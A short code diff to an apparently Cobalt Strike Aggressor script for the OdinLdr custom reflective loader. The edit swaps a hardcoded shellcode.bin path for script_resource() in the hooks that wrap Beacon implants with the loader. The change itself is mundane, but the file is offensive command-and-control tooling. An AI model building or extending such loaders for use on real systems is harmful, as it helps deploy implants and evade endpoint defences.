@@ -8,8 +8,7 @@ set BEACON_RDLL_GENERATE {
     println("           \\/      \\/         \\/          \\/    \\/        ");
     println("   v1.0 by @RtlDallas\n")
 
-    $loader_path = getFileProper("C:\\Dev\\OdinLdr\\shellcode.bin" );
-    $file_handle = openf($loader_path);
+    $file_handle = openf(script_resource("shellcode.bin"));
 
     $ldr = readb($file_handle, -1);
     $beacon = $2;
@@ -35,8 +34,7 @@ set BEACON_RDLL_GENERATE_LOCAL {
     println("           \\/      \\/         \\/          \\/    \\/        ");
     println("   v1.0 by @RtlDallas\n")
 
-    $loader_path = getFileProper("C:\\Dev\\OdinLdr\\shellcode.bin" );
-    $file_handle = openf($loader_path);
+    $file_handle = openf(script_resource("shellcode.bin"));
 
     $ldr = readb($file_handle, -1);
     $beacon = $2;
